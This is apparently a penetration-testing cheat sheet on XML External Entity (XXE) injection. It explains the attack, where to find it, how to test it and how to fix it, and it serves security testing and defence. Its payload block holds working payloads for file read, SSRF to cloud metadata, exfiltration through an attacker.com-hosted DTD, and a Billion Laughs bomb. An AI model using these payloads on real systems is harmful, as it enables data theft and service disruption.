# XML External Entity (XXE)

## Overview
XXE injection exploits vulnerable XML parsers that process user-supplied XML with external entity references enabled. An attacker can define a custom XML entity that references a file path or URL — when the parser processes this entity, it fetches and may include the content in the response (or in an out-of-band channel). XXE can lead to arbitrary file read, SSRF, and in some configurations, remote code execution.

## How It Works
- XML supports "external entities" — references to resources outside the document (local files via `file://`, remote URLs via `http://`).
- If the XML parser has external entity processing enabled (often the default), it follows these references.
- The attacker supplies crafted XML with a `DOCTYPE` containing an external entity that points to a sensitive file or internal URL.
- The parser fetches the resource and the content appears in the response (classic XXE) or triggers an OOB callback (blind XXE).

## Impact
- Arbitrary local file read (`/etc/passwd`, `/etc/shadow`, application config files, private keys).
- SSRF to internal services (cloud metadata at `169.254.169.254`, internal APIs).
- Blind XXE for data exfiltration via DNS/HTTP out-of-band channel.
- Denial of service via "Billion Laughs" XML bomb (entity expansion attack).
- In rare server configs: remote code execution via `expect://` or `php://` wrappers.

## Where to Look
- Any endpoint that accepts XML input: SOAP web services, REST APIs with `Content-Type: application/xml`.
- File upload endpoints that process XML formats: DOCX, XLSX, SVG, ODT, RSS/Atom feeds.
- APIs that convert between formats (e.g., accept JSON but also support XML via content negotiation).
- PDF generators, HTML-to-PDF tools that parse SVG.
- GraphQL endpoints that accept XML-encoded variables.
- `Content-Type: text/xml`, `application/xml`, `application/xhtml+xml`.

## Testing Steps
1. Find an endpoint that accepts XML input.
2. Check if you can inject a `<!DOCTYPE>` declaration and define entities.
3. Inject a basic external entity referencing `/etc/passwd`:
4. Submit the payload and check the response for file content.
5. If no output, try blind XXE via DNS/HTTP callback to Burp Collaborator.
6. Test SSRF by pointing entity at internal network addresses.
7. Test error-based XXE: reference a non-existent file to trigger a helpful error message.
8. Try parameter entities for bypassing some filters.

## Payloads / Techniques
```xml
<!-- Basic file read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- Windows file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<foo>&xxe;</foo>

<!-- SSRF to cloud metadata -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>

<!-- Blind XXE via OOB DNS (Burp Collaborator) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://BURP_COLLAB.burpcollaborator.net/">
  %xxe;
]>
<foo>test</foo>

<!-- Blind XXE data exfiltration via parameter entities -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>

<!-- evil.dtd content (hosted on attacker server) -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;

<!-- Billion Laughs DoS -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

## Burp Suite Tips
- **Burp Collaborator** (Pro) is essential for detecting blind XXE — use the "Insert Collaborator payload" feature.
- **Active Scanner** (Pro) auto-detects XXE including blind variants.
- Change `Content-Type` to `application/xml` in Repeater and inject DOCTYPE above the root element.
- Upload DOCX files with modified `word/document.xml` containing XXE payloads.
- Use the **XXE Injector** BApp extension for automated testing.

## Tools
- Burp Suite (Collaborator + Scanner)
- XXEinjector — https://github.com/enjoiz/XXEinjector
- oxml_xxe — https://github.com/BuffaloWill/oxml_xxe (inject XXE into DOCX/XLSX/etc.)

## Remediation
- Disable external entity processing in the XML parser:
  - Java (JAXP): `factory.setFeature("http://xml.org/sax/features/external-general-entities", false)`
  - Python (lxml): `parser = etree.XMLParser(resolve_entities=False, no_network=True)`
  - PHP: `libxml_disable_entity_loader(true)` (PHP < 8.0)
- Use `defusedxml` library in Python.
- If possible, use JSON instead of XML for APIs.
- Validate XML against a strict schema (XSD) before parsing.
- Apply the principle of least privilege to the web server's filesystem access.

## References
https://portswigger.net/web-security/xxe
https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)
